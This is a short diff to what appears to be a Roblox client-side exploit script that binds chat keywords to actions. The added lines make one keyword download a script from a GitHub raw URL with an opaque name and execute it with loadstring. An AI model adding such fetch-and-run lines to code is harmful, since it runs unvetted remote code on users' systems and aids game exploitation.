@@ -91,6 +91,12 @@ end)
 
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == e then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
+end
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == g then
 local Humanoid = game.Players.LocalPlayer.Character.Humanoid;
 game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
